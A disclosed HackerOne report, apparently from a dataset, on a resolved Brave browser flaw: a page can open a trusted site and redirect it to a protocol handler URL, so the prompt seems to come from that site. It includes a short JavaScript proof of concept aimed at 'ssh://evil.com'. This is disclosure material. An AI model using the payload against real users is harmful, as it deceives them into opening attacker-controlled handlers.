---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '374969'
original_report_id: '374969'
title: Navigation to protocol handler URL from the opened page displayed as a request
  from this page.
team_handle: brave
created_at: '2018-07-01T13:22:11.401Z'
disclosed_at: '2018-09-24T23:36:34.963Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 25
asset_identifier: https://github.com/brave/browser-laptop
asset_type: SOURCE_CODE
max_severity: none
tags:
- hackerone
---

# Navigation to protocol handler URL from the opened page displayed as a request from this page.

## Metadata

- HackerOne Report ID: 374969
- Weakness: 
- Program: brave
- Disclosed At: 2018-09-24T23:36:34.963Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Navigation to protocol handler URL from the page opened using `window.open` is considered as a request from the opened page.

Example: 
1. The page opens `google.com`
2. The page changes opened window's location to `ssh://evil.com`
3. Request to open `ssh://evil.com` URL displayed at `google.com`

**Combining this vulnerability with #369185 makes the attack scenario in #369218 more available.**

## Products affected: 

Brave: 0.23.19 
V8: 6.7.288.46 
rev: 178c3fbc045a0cbdbe098db08307503cce952081 
Muon: 7.1.3 
OS Release: 17.6.0 
Update Channel: Release 
OS Architecture: x64 
OS Platform: macOS 
Node.js: 7.9.0 
Tor: 0.3.3.7 (git-035a35178c92da94) 
Brave Sync: v1.4.2 
libchromiumcontent: 67.0.3396.87

## Steps To Reproduce:

PoC:
``` html
<script>
    window.onclick = () => {
        w = window.open("https://google.com")
        setTimeout(() => {
            t = w.location.replace('ssh://evil.com');
        }, 1000)
    }
</script>
```

## Supporting Material/References:

Screencast + PoC attached.

## Impact

An attacker could trick a user to open protocol handler from a trusted site.

**Combining this with #369185 makes the attack scenario in #369218 more available.**

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
